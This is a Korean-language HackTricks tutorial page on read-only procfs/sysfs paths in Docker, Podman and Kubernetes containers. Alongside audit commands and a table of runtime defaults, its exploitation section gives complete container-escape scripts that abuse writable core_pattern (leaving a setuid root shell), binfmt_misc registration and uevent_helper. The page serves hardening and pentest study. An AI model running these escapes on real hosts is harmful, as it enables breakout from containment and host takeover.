# 읽기 전용 시스템 경로

{{#include ../../../../banners/hacktricks-training.md}}

읽기 전용 시스템 경로는 masked paths와는 별개의 보호 메커니즘입니다. 경로를 완전히 숨기지 않고 노출하되 읽기 전용으로 마운트합니다. 이는 읽기 접근이 허용되거나 운영상 필요할 수 있지만 쓰기는 너무 위험한 일부 procfs 및 sysfs 위치에서 흔히 사용됩니다.

목적은 간단합니다: 많은 커널 인터페이스는 쓰기가 가능해지면 훨씬 더 위험해집니다. 읽기 전용 마운트는 모든 정찰 가치를 제거하지는 않지만, 손상된 workload가 해당 경로를 통해 기저의 커널 향 파일을 수정하는 것을 막아줍니다.

## 동작

런타임은 종종 proc/sys 뷰의 일부를 읽기 전용으로 표시합니다. 런타임과 호스트에 따라 다음과 같은 경로가 포함될 수 있습니다:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

실제 목록은 달라질 수 있지만 모델은 동일합니다: 필요한 곳에서는 가시성을 허용하고, 기본적으로 변경(수정)은 차단합니다.

## 실습

Docker에 의해 선언된 읽기 전용 경로 목록을 확인하세요:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
컨테이너 내부에서 마운트된 proc/sys 뷰를 확인하세요:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## 보안 영향

읽기 전용 시스템 경로는 호스트에 영향을 미치는 광범위한 악용을 제한한다. 공격자가 procfs나 sysfs를 검사할 수 있더라도, 그곳에 쓸 수 없으면 커널 조정 파라미터, 충돌 처리기, 모듈 로드 헬퍼 또는 기타 제어 인터페이스를 직접 수정하는 많은 경로가 사라진다. 노출이 완전히 사라지는 것은 아니지만, 정보 유출에서 호스트 영향으로 전환되는 것이 더 어려워진다.

## 구성 오류

주요 실수는 민감한 경로의 마스크를 해제하거나 재마운트하여 읽기-쓰기로 만드는 것, writable bind mounts로 호스트의 proc/sys 내용을 직접 노출하는 것, 또는 런타임의 더 안전한 기본값을 사실상 우회하는 privileged 모드를 사용하는 것이다. In Kubernetes, `procMount: Unmasked` and privileged workloads often travel together with weaker proc protection. 또 다른 일반적인 운영 실수는 런타임이 보통 이러한 경로를 읽기 전용으로 마운트하므로 모든 워크로드가 여전히 해당 기본값을 상속한다고 가정하는 것이다.

## 악용

보호가 약한 경우, 쓰기 가능한 proc/sys 항목을 찾는 것부터 시작하라:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
쓰기 가능한 항목이 있을 경우, 가치 높은 후속 경로는 다음과 같습니다:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
What these commands can reveal:

- `/proc/sys` 아래의 쓰기 가능한 항목들은 컨테이너가 단순히 검사하는 수준이 아니라 호스트 커널 동작을 수정할 수 있음을 의미하는 경우가 많습니다.
- `core_pattern`은 특히 중요합니다. 쓰기 가능한 호스트-대상 값은 파이프 핸들러를 설정한 뒤 프로세스를 크래시시켜 호스트 code-execution 경로로 전환될 수 있기 때문입니다.
- `modprobe`는 모듈 로딩 관련 흐름에서 커널이 사용하는 helper를 드러냅니다; 쓰기 가능할 때 전형적인 고가치 목표입니다.
- `binfmt_misc`는 커스텀 인터프리터 등록이 가능한지 알려줍니다. 등록이 쓰기 가능하면, 단순한 information leak 대신 execution primitive가 될 수 있습니다.
- `panic_on_oom`은 호스트 전체에 적용되는 커널 결정을 제어하므로, 리소스 고갈을 호스트에 대한 denial of service로 바꿀 수 있습니다.
- `uevent_helper`는 writable sysfs helper 경로가 호스트 컨텍스트에서 실행을 발생시키는 가장 명확한 예 중 하나입니다.

흥미로운 발견으로는 원래 읽기 전용이어야 할 호스트-대상 proc 설정값이나 sysfs 엔트리가 쓰기 가능해진 경우가 포함됩니다. 그 시점에서 워크로드는 제한된 컨테이너 관점에서 벗어나 커널에 실질적인 영향을 미칠 수 있게 됩니다.

### 전체 예: `core_pattern` Host Escape

컨테이너 내부에서 `/proc/sys/kernel/core_pattern`이 쓰기 가능하고 호스트 커널 뷰를 가리키면, 크래시 발생 후 payload를 실행하도록 악용될 수 있습니다:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
경로가 실제로 호스트 커널에 도달하면, payload는 호스트에서 실행되며 setuid shell을 남깁니다.

### 전체 예제: `binfmt_misc` 등록

만약 `/proc/sys/fs/binfmt_misc/register`가 쓰기 가능하다면, 커스텀 인터프리터 등록은 일치하는 파일이 실행될 때 코드 실행을 유발할 수 있습니다:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
호스트에 노출된 쓰기 가능한 `binfmt_misc`에서는 kernel-triggered interpreter path에서 코드 실행이 발생한다.

### 전체 예: `uevent_helper`

`/sys/kernel/uevent_helper`가 쓰기 가능하면, kernel은 일치하는 이벤트가 트리거될 때 host-path helper를 호출할 수 있다:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
이것이 매우 위험한 이유는 helper path가 안전한 container-only 컨텍스트가 아니라 host filesystem 관점에서 해석되기 때문이다.

## 검사

이 검사들은 procfs/sysfs 노출이 예상대로 read-only인지, 그리고 workload가 여전히 민감한 커널 인터페이스를 수정할 수 있는지 여부를 판단한다.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
What is interesting here:

- 일반적인 하드닝된 워크로드는 쓰기 가능한 /proc/sys 항목을 거의 노출하지 않아야 합니다.
- 쓰기 가능한 `/proc/sys` 경로는 일반적인 읽기 접근보다 더 중요할 때가 많습니다.
- 런타임에서 경로를 읽기 전용으로 표시하지만 실제로 쓰기가 가능하다면 mount propagation, bind mounts, 및 privilege settings을 면밀히 검토하세요.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Enabled by default | Docker는 민감한 proc 항목에 대한 기본 read-only 경로 목록을 정의합니다 | 호스트 proc/sys 마운트 노출, `--privileged` |
| Podman | Enabled by default | Podman은 명시적으로 완화되지 않는 한 기본 read-only 경로를 적용합니다 | `--security-opt unmask=ALL`, 광범위한 호스트 마운트, `--privileged` |
| Kubernetes | Inherits runtime defaults | Pod 설정이나 호스트 마운트로 약화되지 않는 한 기본 런타임의 read-only 경로 모델을 사용합니다 | `procMount: Unmasked`, privileged workloads, 쓰기 가능한 호스트 proc/sys 마운트 |
| containerd / CRI-O under Kubernetes | Runtime default | 보통 OCI/runtime 기본값에 의존합니다 | Kubernetes 행과 동일; 직접 런타임 구성 변경으로 동작이 약화될 수 있음 |

요점은 read-only 시스템 경로가 보통 런타임 기본값으로 존재하지만, privileged 모드나 호스트 bind mounts로 쉽게 무력화될 수 있다는 것입니다.
{{#include ../../../../banners/hacktricks-training.md}}
